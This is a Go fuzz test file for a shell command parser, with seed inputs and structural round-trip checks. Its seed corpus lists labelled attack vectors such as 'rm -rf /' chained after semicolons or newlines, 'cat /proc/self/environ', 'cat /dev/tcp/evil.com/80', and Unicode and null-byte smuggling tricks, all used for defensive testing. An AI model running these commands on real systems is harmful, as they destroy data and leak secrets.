package parser

import (
	"strings"
	"testing"
)

// FuzzParse feeds arbitrary strings into Parse and verifies that:
//  1. It never panics (the fuzzer's primary goal).
//  2. On success, structural invariants hold: at least one segment,
//     non-empty Command in every segment, and only valid operators.
func FuzzParse(f *testing.F) {
	// --- Seed corpus ---

	// Normal commands.
	f.Add("ls /tmp")
	f.Add("grep -r pattern /var/log")
	f.Add("cat /etc/hostname")
	f.Add("wc -l")
	f.Add("head -n 10 /var/log/syslog")
	f.Add("tail -f /var/log/auth.log")
	f.Add("ps aux")
	f.Add("df -h")
	f.Add("du -sh /tmp")
	f.Add("whoami")
	f.Add("uname -a")
	f.Add("find /var/log -name '*.log'")
	f.Add(`find / -name "*.log"`)

	// Pipelines.
	f.Add("ls | grep error | head -n 5")
	f.Add("cat /etc/passwd | wc -l")
	f.Add("ps aux | grep ssh | grep -v grep")

	// Chaining.
	f.Add("cmd1 && cmd2 || cmd3")
	f.Add("ls /tmp && echo done")
	f.Add("ls /tmp || echo fail")
	f.Add("ls /tmp | grep error && echo done || echo fail")

	// Quoted arguments.
	f.Add(`echo "hello world"`)
	f.Add(`echo 'hello world'`)
	f.Add(`grep -r "some pattern" /var/log`)
	f.Add(`echo "it's a test"`)
	f.Add(`echo 'it"s a test'`)

	// Attack vectors: semicolons / multiple statements.
	f.Add("ls; rm -rf /")
	f.Add("ls /tmp\nrm -rf /")
	f.Add("; ls /tmp")
	f.Add("ls /tmp; echo pwned; rm -rf /")
	f.Add("ls /tmp\r\nrm -rf /")

	// Attack vectors: command/process substitution.
	f.Add("$(whoami)")
	f.Add("`id`")
	f.Add("echo $(whoami)")
	f.Add("echo `id`")
	f.Add("diff <(ls /tmp) <(ls /var)")
	f.Add(`echo "$(whoami)"`)

	// Attack vectors: variable expansion.
	f.Add("echo $HOME")
	f.Add("echo ${HOME:-/root}")
	f.Add("echo $((1+2))")
	f.Add(`echo "$HOME"`)

	// Attack vectors: redirections.
	f.Add("ls > /tmp/out")
	f.Add("echo data >> /tmp/out")
	f.Add("ls 2> /tmp/errors")
	f.Add("cat < /etc/passwd")
	f.Add("cat << EOF\nhello\nEOF")
	f.Add("cat <<< 'hello'")
	f.Add("ls 2>&1")

	// Attack vectors: background.
	f.Add("sleep 10 &")
	f.Add("ls & rm")

	// Attack vectors: control flow.
	f.Add("if true; then ls; fi")
	f.Add("while true; do echo loop; done")
	f.Add("for i in 1 2 3; do echo $i; done")
	f.Add("case x in y) echo z;; esac")
	f.Add("until false; do echo loop; done")
	f.Add("select x in 1 2 3; do echo $x; done")
	f.Add("coproc cat")
	f.Add("time ls")
	f.Add("{ ls; }")
	f.Add("{ ls; echo done; }")
	f.Add("[[ -f /etc/passwd ]]")
	f.Add("(( x++ ))")
	f.Add("foo() { echo bar; }")
	f.Add("(ls /tmp)")

	// Attack vectors: assignments.
	f.Add("FOO=bar ls")
	f.Add("FOO=bar")
	f.Add("PATH=/evil ls")
	f.Add("export FOO=bar")
	f.Add("declare -x FOO=bar")

	// Attack vectors: brace expansion.
	f.Add("echo {a,b,c}")
	f.Add("echo a{b,c}d")

	// Attack vectors: ext globs.
	f.Add("ls ?(foo|bar)")
	f.Add("ls *(foo|bar)")
	f.Add("ls +(foo|bar)")
	f.Add("ls @(foo|bar)")
	f.Add("ls !(foo|bar)")

	// Attack vectors: dangerous commands (allowed by parser, rejected by validator).
	f.Add("eval ls")
	f.Add("source /tmp/evil.sh")
	f.Add(". /tmp/evil.sh")
	f.Add("exec /bin/bash")

	// Attack vectors: ANSI-C / locale quoting.
	f.Add("echo $'hello'")
	f.Add(`echo $'line1\nline2'`)
	f.Add(`echo $"hello"`)

	// Attack vectors: path traversal.
	f.Add("/bin/rm -rf /")
	f.Add("./evil")
	f.Add("../../../bin/bash")
	f.Add("cat /proc/self/environ")
	f.Add("cat /dev/tcp/evil.com/80")

	// Edge cases: empty / whitespace.
	f.Add("")
	f.Add("   ")
	f.Add("\t")
	f.Add("\n")
	f.Add("\r\n")

	// Edge cases: unicode.
	f.Add("ls\u200b /tmp")          // zero-width space
	f.Add("l\u200ds /tmp")          // zero-width joiner
	f.Add("\uFEFFls /tmp")          // BOM
	f.Add("ls\u00A0/tmp")           // non-breaking space
	f.Add("/bi\u00ADn/ls /tmp")     // soft hyphen
	f.Add("ls \u202E/tmp")          // RTL override
	f.Add("echo \u2018hello\u2019") // smart quotes

	// Edge cases: null bytes.
	f.Add("rm\x00_safe -rf /")
	f.Add("ls\x00 /tmp")

	// Edge cases: special characters.
	f.Add("echo \\$HOME")
	f.Add("ls /tmp\\; rm -rf /")
	f.Add("echo ''''")
	f.Add("ls /tmp # this is a comment")
	f.Add("ls #\nrm -rf /")
	f.Add("ls \\\n/tmp")

	// Edge cases: very long strings.
	f.Add("echo " + strings.Repeat("a", 10000))
	f.Add(strings.Repeat("a", 10000))

	// Edge cases: fullwidth homoglyphs.
	f.Add("ls /tmp\uFF1B rm -rf /") // fullwidth semicolon
	f.Add("ls /tmp\uFF5C rm -rf /") // fullwidth pipe

	// Edge cases: quote concatenation.
	f.Add("'r''m' -rf /")
	f.Add(`"r""m" -rf /`)
	f.Add(`'"rm"' -rf /`)
	f.Add(`"'rm'" -rf /`)

	// Edge cases: carriage return / vertical tab / form feed.
	f.Add("ls /tmp\rrm -rf /")
	f.Add("ls\v/tmp")
	f.Add("ls\f/tmp")

	validOperators := map[string]bool{
		"":   true,
		"|":  true,
		"&&": true,
		"||": true,
	}

	f.Fuzz(func(t *testing.T, input string) {
		pipeline, err := Parse(input)
		if err != nil {
			// Parse returned an error — that's fine, just ensure no panic.
			return
		}

		// Invariant: successful parse must return at least one segment.
		if len(pipeline.Segments) == 0 {
			t.Fatal("Parse succeeded but returned zero segments")
		}

		for i, seg := range pipeline.Segments {
			// Invariant: every segment must have a non-empty Command.
			if seg.Command == "" {
				t.Fatalf("segment[%d].Command is empty", i)
			}

			// Invariant: Operator must be one of the valid set.
			if !validOperators[seg.Operator] {
				t.Fatalf("segment[%d].Operator = %q, not in valid set", i, seg.Operator)
			}
		}

		// Invariant: first segment should have an empty operator (no preceding operator).
		if pipeline.Segments[0].Operator != "" {
			t.Fatalf("segment[0].Operator = %q, want empty", pipeline.Segments[0].Operator)
		}
	})
}

// FuzzParseRoundTrip tests parse self-consistency by parsing input, reconstructing
// a command string from the result, re-parsing, and verifying the structure matches.
//
// This catches cases where the parser produces output that, when fed back in,
// yields a different structure.
func FuzzParseRoundTrip(f *testing.F) {
	// Seed corpus: inputs likely to succeed parsing (no attack vectors).
	f.Add("ls /tmp")
	f.Add("grep -r pattern /var/log")
	f.Add("cat /etc/hostname")
	f.Add("wc -l")
	f.Add("head -n 10 /var/log/syslog")
	f.Add("ls | grep error | head -n 5")
	f.Add("cat /etc/passwd | wc -l")
	f.Add("cmd1 && cmd2 || cmd3")
	f.Add("ls /tmp && echo done")
	f.Add("ls /tmp || echo fail")
	f.Add("ls /tmp | grep error && echo done || echo fail")
	f.Add(`echo "hello world"`)
	f.Add(`echo 'hello world'`)
	f.Add(`find /var/log -name "*.log"`)
	f.Add("ps aux")
	f.Add("df -h")
	f.Add("du -sh /tmp")
	f.Add("whoami")
	f.Add("uname -a")
	f.Add("echo hello")
	f.Add("echo foo bar baz")
	f.Add("/bin/ls /tmp")
	f.Add("./script /tmp")
	f.Add("ls ~")
	f.Add("cat ~/file")
	f.Add("echo *.log")
	f.Add("echo ?.log")

	f.Fuzz(func(t *testing.T, input string) {
		pipeline, err := Parse(input)
		if err != nil {
			// Can't round-trip something that didn't parse.
			return
		}

		// Skip inputs whose parsed tokens contain quote characters. The parser's
		// wordToString strips matching outer quotes (lines 167-174 of parser.go),
		// so tokens containing ' or " cannot round-trip reliably: our reconstruction
		// wraps them in single quotes, the re-parse applies quote stripping again,
		// and the result differs. This is expected parser behavior, not a bug.
		for _, seg := range pipeline.Segments {
			if containsNonRoundTrippable(seg.Command) {
				return
			}
			for _, arg := range seg.Args {
				if containsNonRoundTrippable(arg) {
					return
				}
			}
		}

		// Reconstruct a command string from the parsed pipeline.
		// We single-quote every token to avoid shell interpretation on re-parse.
		reconstructed := reconstruct(pipeline)
		if reconstructed == "" {
			// Degenerate case — nothing to re-parse.
			return
		}

		pipeline2, err := Parse(reconstructed)
		if err != nil {
			// If reconstruction produced something unparseable, that's a
			// consistency issue worth investigating, but some edge cases
			// can cause this legitimately. Skip those.
			t.Skipf("round-trip re-parse failed: input=%q reconstructed=%q err=%v", input, reconstructed, err)
			return
		}

		// Verify structural equivalence.
		if len(pipeline2.Segments) != len(pipeline.Segments) {
			t.Fatalf("round-trip segment count: got %d, want %d\ninput:         %q\nreconstructed: %q",
				len(pipeline2.Segments), len(pipeline.Segments), input, reconstructed)
		}

		for i := range pipeline.Segments {
			s1 := pipeline.Segments[i]
			s2 := pipeline2.Segments[i]

			if s1.Command != s2.Command {
				t.Fatalf("round-trip segment[%d].Command: got %q, want %q\ninput:         %q\nreconstructed: %q",
					i, s2.Command, s1.Command, input, reconstructed)
			}

			if s1.Operator != s2.Operator {
				t.Fatalf("round-trip segment[%d].Operator: got %q, want %q\ninput:         %q\nreconstructed: %q",
					i, s2.Operator, s1.Operator, input, reconstructed)
			}

			if len(s1.Args) != len(s2.Args) {
				t.Fatalf("round-trip segment[%d].Args length: got %d, want %d\ninput:         %q\nreconstructed: %q",
					i, len(s2.Args), len(s1.Args), input, reconstructed)
			}

			for j := range s1.Args {
				if s1.Args[j] != s2.Args[j] {
					t.Fatalf("round-trip segment[%d].Args[%d]: got %q, want %q\ninput:         %q\nreconstructed: %q",
						i, j, s2.Args[j], s1.Args[j], input, reconstructed)
				}
			}
		}
	})
}

// reconstruct builds a command string from a parsed pipeline by single-quoting
// each token. This is a simple inline implementation to avoid importing the ssh
// package (which would create a circular dependency).
func reconstruct(p *Pipeline) string {
	var b strings.Builder
	for i, seg := range p.Segments {
		if i > 0 && seg.Operator != "" {
			b.WriteString(" ")
			b.WriteString(seg.Operator)
			b.WriteString(" ")
		}
		b.WriteString(shellQuote(seg.Command))
		for _, arg := range seg.Args {
			b.WriteString(" ")
			b.WriteString(shellQuote(arg))
		}
	}
	return b.String()
}

// containsNonRoundTrippable returns true if s contains characters that prevent
// reliable round-tripping through the parser. This includes:
//   - Quote characters (' and ") — the parser's quote stripping alters them
//   - Control characters (\r, \f, \v, \x00) — the printer normalizes these
//   - Backslashes — interact with shell escaping in non-idempotent ways
func containsNonRoundTrippable(s string) bool {
	for _, c := range s {
		switch {
		case c == '\'' || c == '"':
			return true
		case c == '\\':
			return true
		case c == '\r' || c == '\f' || c == '\v' || c == '\x00':
			return true
		case c < 0x20 && c != '\t' && c != '\n':
			// Other ASCII control characters.
			return true
		}
	}
	return false
}

// shellQuote wraps s in single quotes, escaping any embedded single quotes
// using the standard bash idiom: replace ' with '\” (end quote, escaped
// literal quote, start quote).
func shellQuote(s string) string {
	if s == "" {
		return "''"
	}
	// If the string contains no single quotes and no special chars, we can
	// still wrap it for safety.
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}
